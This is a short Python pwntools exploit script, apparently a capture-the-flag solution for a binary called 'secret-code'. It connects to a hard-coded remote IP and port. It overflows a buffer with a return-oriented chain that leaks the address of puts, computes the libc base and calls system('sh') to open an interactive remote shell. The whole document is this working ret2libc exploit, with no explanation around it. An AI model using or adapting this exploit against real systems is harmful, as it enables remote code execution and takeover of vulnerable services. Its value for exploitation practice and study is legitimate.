from pwn import *

e = ELF("./secret-code")
libc = ELF("./libc6_2.23-0ubuntu10_amd64.so")
context.binary = e

r = remote("35.240.148.138",5005)
#r = process([e.path])

pop_rdi = 0x400733

payload = b'A'*120 + p64(pop_rdi) + p64(e.got['puts']) + p64(e.plt['puts']) + p64(e.symbols['main'])
r.sendlineafter('?\n',payload)
r.recvline()
leaked_puts = u64(r.recvline()[:-1].ljust(8,b"\x00"))
baseaddr = leaked_puts - libc.symbols['puts']
system = baseaddr + libc.symbols['system']
binsh = baseaddr + next(libc.search(b'sh\x00'))
payload = b'A'*120 + p64(pop_rdi) + p64(binsh) + p64(system)
r.sendlineafter('?\n',payload)
r.interactive()